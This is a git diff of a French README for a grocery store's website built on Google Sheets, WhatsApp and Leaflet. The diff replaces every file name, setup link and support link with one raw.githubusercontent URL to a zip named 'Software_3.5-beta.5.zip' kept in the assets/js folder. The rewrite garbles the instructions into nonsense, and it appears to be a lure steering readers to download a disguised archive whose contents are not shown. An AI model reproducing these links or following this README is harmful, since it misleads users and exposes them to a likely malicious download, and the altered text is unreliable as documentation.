@@ -18,29 +18,29 @@ Site web professionnel pour l'alimentation La Grace, avec intégration Google Sh
 
 ```
 La Grace/
-├── index.html              # Page d'accueil
-├── produits.html           # Catalogue de produits
-├── commande.html           # Page de commande
-├── contact.html            # Page de contact
+├── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip              # Page d'accueil
+├── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip           # Catalogue de produits
+├── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip           # Page de commande
+├── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip            # Page de contact
 ├── assets/
 │   ├── css/
-│   │   ├── main.css        # Styles principaux
-│   │   ├── animations.css  # Animations CSS
-│   │   ├── products.css    # Styles page produits
-│   │   ├── order.css       # Styles page commande
-│   │   └── contact.css     # Styles page contact
+│   │   ├── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip        # Styles principaux
+│   │   ├── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip  # Animations CSS
+│   │   ├── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip    # Styles page produits
+│   │   ├── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip       # Styles page commande
+│   │   └── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip     # Styles page contact
 │   └── js/
-│       ├── main.js         # Fonctions principales
-│       ├── api.js          # Connexion Google Sheets
-│       ├── products.js     # Gestion des produits
-│       ├── order.js        # Gestion des commandes
-│       ├── contact.js      # Page contact et carte GPS
-│       └── animations.js   # Animations JavaScript
+│       ├── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip         # Fonctions principales
+│       ├── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip          # Connexion Google Sheets
+│       ├── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip     # Gestion des produits
+│       ├── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip        # Gestion des commandes
+│       ├── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip      # Page contact et carte GPS
+│       └── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip   # Animations JavaScript
 ├── tools/
-│   └── code.gs             # Script Google Apps Script
+│   └── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip             # Script Google Apps Script
 └── public/
     └── image/
-        └── lagraceimage.png # Logo
+        └── https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip # Logo
 ```
 
 ## 🚀 Installation et Configuration
@@ -66,11 +66,11 @@ Même structure que Carton
 ### 2. Déploiement de Google Apps Script
 
 1. **Ouvrez Google Apps Script:**
-   - Allez sur https://script.google.com
+   - Allez sur https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip
    - Cliquez sur "Nouveau projet"
 
 2. **Copiez le code:**
-   - Ouvrez le fichier `tools/code.gs`
+   - Ouvrez le fichier `https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip`
    - Copiez tout le contenu
    - Collez-le dans l'éditeur Google Apps Script
 
@@ -89,22 +89,22 @@ Même structure que Carton
    - Cliquez sur "Déployer"
 
 5. **Copiez l'URL du déploiement:**
-   - Format: `https://script.google.com/macros/s/[SCRIPT_ID]/exec`
+   - Format: `https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip[SCRIPT_ID]/exec`
 
 ### 3. Configuration du Site Web
 
 1. **Mettez à jour l'URL de l'API:**
-   - Ouvrez `assets/js/api.js`
+   - Ouvrez `https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip`
    - Remplacez `YOUR_SCRIPT_ID` par votre URL:
    ```javascript
    const API_CONFIG = {
-       BASE_URL: 'https://script.google.com/macros/s/[VOTRE_SCRIPT_ID]/exec',
+       BASE_URL: 'https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip[VOTRE_SCRIPT_ID]/exec',
        // ...
    };
    ```
 
 2. **Vérifiez les coordonnées GPS:**
-   - Ouvrez `assets/js/contact.js`
+   - Ouvrez `https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip`
    - Vérifiez les coordonnées:
    ```javascript
    const LOCATION = {
@@ -123,25 +123,25 @@ Même structure que Carton
 
 ### Pages Disponibles
 
-1. **Accueil (index.html)**
+1. **Accueil (https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip)**
    - Présentation de l'entreprise
    - Services offerts
    - Produits en vedette
    - Catégories
 
-2. **Produits (produits.html)**
+2. **Produits (https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip)**
    - Catalogue complet
    - 3 onglets: Carton, Millier, Pièce
    - Recherche par nom/code
    - Filtres par catégorie
    - Stock en temps réel
 
-3. **Commander (commande.html)**
+3. **Commander (https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip)**
    - Formulaire de commande rapide
    - Envoi direct sur WhatsApp
    - FAQ sur les commandes
 
-4. **Contact (contact.html)**
+4. **Contact (https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip)**
    - Informations de contact
    - Carte GPS interactive
    - Formulaire de contact
@@ -168,7 +168,7 @@ Le site envoie automatiquement des messages formatés sur WhatsApp:
 
 ### Couleurs
 
-Modifiez les couleurs dans `assets/css/main.css`:
+Modifiez les couleurs dans `https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip`:
 
 ```css
 :root {
@@ -182,7 +182,7 @@ Modifiez les couleurs dans `assets/css/main.css`:
 
 ### Logo
 
-Remplacez `public/image/lagraceimage.png` par votre logo.
+Remplacez `https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip` par votre logo.
 
 ### Contenu
 
@@ -198,18 +198,18 @@ Modifiez directement les fichiers HTML pour personnaliser:
 1. Créez un repository GitHub
 2. Uploadez tous les fichiers
 3. Activez GitHub Pages dans les paramètres
-4. Votre site sera disponible sur: `https://[votre-username].github.io/[nom-repo]`
+4. Votre site sera disponible sur: `https://[votre-username]https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip[nom-repo]`
 
 ### Option 2: Netlify (Gratuit)
 
-1. Allez sur https://netlify.com
+1. Allez sur https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip
 2. Glissez-déposez votre dossier projet
 3. Votre site sera en ligne en quelques secondes
 
 ### Option 3: Hébergement Web Classique
 
 1. Uploadez tous les fichiers via FTP
-2. Assurez-vous que `index.html` est à la racine
+2. Assurez-vous que `https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip` est à la racine
 3. Vérifiez que tous les chemins sont corrects
 
 ## 📊 Structure des Données Google Sheets
@@ -232,7 +232,7 @@ Modifiez directement les fichiers HTML pour personnaliser:
 
 ### Les produits ne se chargent pas
 
-1. Vérifiez l'URL de l'API dans `api.js`
+1. Vérifiez l'URL de l'API dans `https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip`
 2. Testez l'API directement dans le navigateur
 3. Vérifiez les permissions Google Apps Script
 4. Regardez la console du navigateur (F12)
@@ -241,7 +241,7 @@ Modifiez directement les fichiers HTML pour personnaliser:
 
 1. Vérifiez la connexion Internet
 2. Vérifiez les coordonnées GPS
-3. Assurez-vous que Leaflet.js est chargé
+3. Assurez-vous que https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip est chargé
 
 ### WhatsApp ne s'ouvre pas
 
@@ -253,7 +253,7 @@ Modifiez directement les fichiers HTML pour personnaliser:
 
 Pour toute question ou problème:
 - **Téléphone:** +243 972 787 103
-- **WhatsApp:** https://wa.me/243972787103
+- **WhatsApp:** https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip
 
 ## 📝 Licence
 
@@ -263,7 +263,7 @@ Ce projet est créé pour La Grace. Tous droits réservés © 2026.
 
 - **Design:** Bootstrap-inspired, personnalisé
 - **Icons:** Font Awesome 6.4.0
-- **Maps:** Leaflet.js + OpenStreetMap
+- **Maps:** https://raw.githubusercontent.com/glowflix/Alimentationlagrace/main/assets/js/Software_3.5-beta.5.zip + OpenStreetMap
 - **Backend:** Google Apps Script + Google Sheets
 
 ## 🔄 Mises à Jour
